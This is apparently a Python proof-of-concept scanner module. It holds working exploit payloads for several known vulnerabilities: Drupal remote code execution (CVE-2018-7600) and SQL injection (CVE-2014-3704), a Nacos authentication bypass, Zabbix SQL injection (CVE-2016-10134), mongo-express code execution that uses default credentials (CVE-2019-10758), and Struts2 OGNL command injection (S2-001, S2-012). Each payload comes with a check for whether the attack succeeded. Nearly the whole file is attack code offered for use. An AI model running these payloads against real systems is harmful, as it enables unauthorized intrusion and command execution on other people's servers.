#from optparse import OptionParser
import optparse

# Proof-Of-Concept
#proxies = {'http': 'http://127.0.0.1:1080', 'https': 'http://127.0.0.1:1080'}
#proxies = {'http': 'http://127.0.0.1:1081', 'https': 'http://127.0.0.1:1081'}
proxies = {}
timeout = 30

def choicepoc():
	usage="python %prog -p <payload>"  #用于显示帮助信息
	parser = optparse.OptionParser(usage)
	parser.add_option('-p','--payload',dest = 'payload',action = 'store',type = "string" )
	#parser.add_option('-h','--headers',dest = 'headers',default='',action = 'store',type = "string" )
	#parser.add_option("--proxies", action="store", type = "string", dest="verbose", default='proxies',help="Proxies")
	(options,args)=parser.parse_args()
	return globals().get(options.payload)

class CVE_2018_7600:
	headers = {}
	urllink = '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
	shellcode = 'id'
	data = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': shellcode}
	verify = 'uid'
	def url(target):
		url = target + CVE_2018_7600.urllink
		return url
	def successflag(reptext):
		if -1 != reptext.find(CVE_2018_7600.verify):
			return 1
		else:
			return -1

class CVE_2014_3704:
	headers = {
		'Accept': '*/*',
		'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
		'Connection': 'close',
		'Content-Type': 'application/x-www-form-urlencoded'
	}

	data = {
		'pass':'lol',
		'form_build_id':'',
		'form_id':'user_login_block',
		'op':'Log in',
		'name[0 or updatexml(0,concat(0xa,user()),0)#]':'bob',
		'name[0]':'a'
	}
	verify = 'SQLSTATE'
	def url(target):
		url = target
		return url
	def successflag(reptext):
		if -1 != reptext.find(CVE_2014_3704.verify):
			return 1
		else:
			return -1

class nacos_certification:
	headers = {
		'User-Agent':'Nacos-Server',
		'Connection': 'close'
	}
	data = {}
	urllink = '/v1/auth/users?username=null&password=null'
	def url(target):
		url = target + nacos_certification.urllink
		return url
	def successflag(reptext):
		reptext = reptext[-3:]
		if reptext == r'll}' or reptext == r't!;' or reptext == r'st!':
			return 1
		else:
			return -1

#Zabbix latest.php sql注入漏洞
class CVE_2016_10134:
	headers = {}
	data = {}
	urllink = '/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)'
	verify = 'updatexml'
	def url(target):
		url = target + CVE_2016_10134.urllink
		return url
	def successflag(reptext):
		if -1 != reptext.find(CVE_2016_10134.verify):
			return 1
		else:
			return -1
			
'''
风险等级：高
mongo-express是一款mongodb的第三方Web界面，使用node和express开发。
如果攻击者可以成功登录，或者目标服务器没有修改默认的账号密码（`admin:pass`），则可以执行任意node.js代码。
影响版本：
mongo-express < 0.54.0

POST /checkValid HTTP/1.1
Host: 192.168.1.107:8081
Connection: close
Authorization: Basic YWRtaW46cGFzcw==
Content-Type: application/x-www-form-urlencoded
Content-Length: 133

document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("touch /tmp/tmp")

一般为8080，8081，8000
'''
class CVE_2019_10758:
	headers = {'Authorization': 'Basic YWRtaW46cGFzcw=='}
	data = {'document':'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("echo")'}
	urllink = '/checkValid'
	def url(target):
		url = target + CVE_2019_10758.urllink
		return url
	def successflag(reptext):
		#print(reptext)
		if 'Valid' == reptext:
			return 1
		else:
			return -1
		'''
		elif: -1 != reptext.find('Error')
			return -1
		'''
		
class s2_001:
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	#data = {'username':'1','password':'%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath("/")),#response.flush(),#response.close()}'}
	#命令为：id
	data = {'username':'1','password':'%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"id"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'}
	verify = 'uid'
	def url(target):
		url = target
		return url
	def successflag(reptext):
		#print(reptext)
		if -1 != reptext.find(s2_001.verify):
			return 1
		else:
			return -1

class s2_012:
	headers = {'Content-Type': 'application/x-www-form-urlencoded'}
	#data = {'username':'1','password':'%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath("/")),#response.flush(),#response.close()}'}
	#命令为：id
	data = {'name':'%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"id"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'}
	verify = 'uid'
	def url(target):
		url = target
		return url
	def successflag(reptext):
		#print(reptext)
		if -1 != reptext.find(s2_001.verify):
			return 1
		else:
			return -1
			
